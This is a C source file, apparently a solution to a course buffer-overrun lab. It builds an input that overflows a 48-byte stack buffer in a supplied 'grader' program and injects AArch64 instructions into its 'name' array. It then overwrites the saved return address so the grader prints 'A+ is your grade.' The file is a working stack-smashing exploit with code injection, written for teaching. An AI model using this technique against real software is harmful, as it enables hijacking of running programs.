/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish KKat                                                 */
/*--------------------------------------------------------------------*/
/* Produces a file called dataAplus that will cause the grader program */
/* to print "A+ is your grade." despite it normally never assigning an */
/* A+ grade. The underlying principle is to exploit a buffer overrun   */
/* vulnerability to overwrite the return address on the stack with an  */
/* address in the BSS section (the 'name' array). We will place        */
/* carefully chosen instructions and strings in the 'name' array, and  */
/* after the program returns from getName, it will jump into our       */
/* injected instructions. Those instructions will:                     */
/* 1. Load the address of a string ("A+ is your grade.%c") into x0.    */
/* 2. Move a character (e.g. '\n') into w1.                            */
/* 3. Branch to the printf call site, causing "A+ is your grade." to   */
/*    be printed.                                                      */
/*                                                                    */
/* Thus, when the grader program runs with our crafted input, it will  */
/* output "A+ is your grade." and then the normal thank-you line.      */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "miniassembler.h"

/*--------------------------------------------------------------------*/
/* Interactive behavior of main:
   - The main function does not accept any command-line arguments.
   - It does not read from stdin.
   - It writes binary data to a file named "dataAplus".
   - It does not write anything to stdout or stderr.
   - It returns 0 upon successful completion.                         */
/*--------------------------------------------------------------------*/

int main(void) {
    /*----------------------------------------------------------------*/
    /* Local Variables and Addresses:                                 */
    /* We know from analysis:                                         */
    /* grade char address:            0x420044                        */
    /* name array starts at:         0x420058                        */
    /* We have a buffer of size 48 (buf) on the stack in readString,   */
    /* and we will overflow it to overwrite getName's X30 return       */
    /* address. By placing instructions in 'name', we can cause a jump.*/
    /* The main code calls mprotect(...) so that name array is         */
    /* executable.                                                    */
    /*                                                                */
    /* We'll store:                                                   */
    /* "AnishKKat\0A+ is your grade.%c\0" in the name area first.      */
    /* After that string, we align to a 4-byte boundary, then insert   */
    /* our instructions:                                              */
    /*   adr x0, (address of "A+ is your grade.%c\0")                 */
    /*   mov w1, '\n'                                                 */
    /*   b PRINTF_CALL_SITE                                            */
    /*                                                                */
    /* Then we fill the remainder of the 48 bytes if needed with nulls */
    /* and finally overwrite the stored X30 of getName to point to our */
    /* injected instructions.                                         */
    /*----------------------------------------------------------------*/

    FILE *fp = fopen("dataAplus", "w");
    if (fp == NULL) exit(1);

    /* Constants derived from memory map:
       PRINT_CALL_SITE is where we jump to call printf with our args.
       From analysis, we can call the printf that prints "%c is your grade.\n"
       at address 0x400874 (as seen in the provided example code snippet).
       We'll use the same addresses from example for consistency. */

    enum {
        MAX_BUF = 48,
        GRADE_ADDR = 0x420044,
        PRINT_CALL = 0x400874,   /* Address in main that calls printf("%c is your grade.\n", grade) */
        NAME_START = 0x420058    /* start of the name array */
    };

    /* We'll place our instructions starting right after our strings.
       We'll need to keep track of the current offset. */
    int bytesWritten = 0;
    unsigned long currentAddr = NAME_START;

    /* Write the attacker's name (can truncate if needed). */
    const char *attackerName = "AnishKKat";
    fputs(attackerName, fp);
    bytesWritten += (int)strlen(attackerName);

    /* Null-terminate the name */
    fputc('\0', fp);
    bytesWritten++;

    /* Write the message that we want to print via printf later:
       "A+ is your grade.%c"
       We add a '%c' so that the code at PRINT_CALL prints something nicely.
       Then null-terminate it. */
    fputs("A+ is your grade.%c", fp);
    bytesWritten += 20; /* length of the string "A+ is your grade.%c" is 20 chars */
    fputc('\0', fp);
    bytesWritten++;

    /* Update currentAddr after writing these chars. */
    currentAddr += bytesWritten;

    /* Align currentAddr to a 4-byte boundary for instructions. */
    while ((currentAddr % 4) != 0) {
        fputc(0, fp);
        bytesWritten++;
        currentAddr++;
    }

    /* Now we insert instructions using MiniAssembler:
       1) adr x0, address_of("A+ is your grade.%c")
          This loads the string address into x0 for printf.
       2) mov w1, '\n'
          Move newline char into w1 as argument.
       3) b PRINT_CALL
          Branch to the instruction that calls printf with (x0, w1).

       Note: The string starts at NAME_START + strlen("AnishKKat") + 1 = NAME_START + 10,
       plus the 20 chars of message + 1 null = 31 more bytes, total 41 bytes. So the
       string "A+ is your grade.%c" starts at NAME_START+11 actually (after name+\0).
       Let's be precise:

       NAME_START=0x420058
       We wrote: "AnishKKat" (9 chars) + '\0'(1 char) = 10 bytes total
       So at NAME_START + 10 = 0x420058+10 = 0x420062 starts "A+ is your grade.%c"
       That string is 20 chars + '\0' = 21 bytes.
       The string start: 0x420062
       We'll load this address into x0.

       Instructions placed at currentAddr (NAME_START+31=0x420058+31=0x420077?), 
       but we must re-check after final count:

       Actually bytes after name:
         name: 9 chars  + '\0' =10 bytes
         message: "A+ is your grade.%c"=20 chars + '\0'=21 bytes
         Total so far: 10 + 21 = 31 bytes
       currentAddr=NAME_START+31=0x420058+31=0x420058+0x1F=0x420077
       Aligning currentAddr to 4 bytes: 0x420077 %4=3 remainder, write one null:
       After writing one null: currentAddr=0x420078
       Perfectly divisible by 4 now.

       So instructions start at 0x420078.

       String start address: 0x420062 for "A+ is your grade.%c"

       We'll do:
       adr x0,0x420062 at instrAddr=0x420078
       mov w1,'\n'
       b PRINT_CALL at instrAddr=0x420080 (just next instructions)
    */

    unsigned long instrAddr = currentAddr;  /* where instructions start */
    unsigned long strAddr = 0x420062;       /* address of the string */

    /* adr x0, strAddr */
    unsigned int uiInst = MiniAssembler_adr(0, strAddr, instrAddr);
    fwrite(&uiInst, sizeof(uiInst), 1, fp);
    bytesWritten += 4;
    instrAddr += 4;

    /* mov w1,'\n' */
    uiInst = MiniAssembler_mov(1, '\n');
    fwrite(&uiInst, sizeof(uiInst), 1, fp);
    bytesWritten += 4;
    instrAddr += 4;

    /* b PRINT_CALL */
    uiInst = MiniAssembler_b(PRINT_CALL, instrAddr);
    fwrite(&uiInst, sizeof(uiInst), 1, fp);
    bytesWritten += 4;
    instrAddr += 4;

    /* Fill up to the 48-byte limit of the stack buf if needed. 
       Our instructions and strings must fit in 48 bytes read into buf 
       (actually the input can be longer since no newline is allowed before).
       The grader copies from buf to name array. But we must ensure the return 
       address is overwritten correctly. We'll just pad zeros until we reach 48 bytes.
    */
    while (bytesWritten < MAX_BUF) {
        fputc(0, fp);
        bytesWritten++;
    }

    /* Overwrite getName's X30 with the address of our injected instructions (instrAddr start).
       Our instructions start at 0x420078.
       We placed adr at 0x420078, so let's set the return address to 0x420078. */
    unsigned long jumpAddr = 0x420078;
    fwrite(&jumpAddr, sizeof(jumpAddr), 1, fp);

    /* Write EOF */
    /* Not strictly necessary, but just to end the file cleanly. */
    fputc(EOF, fp);

    fclose(fp);
    return 0;
}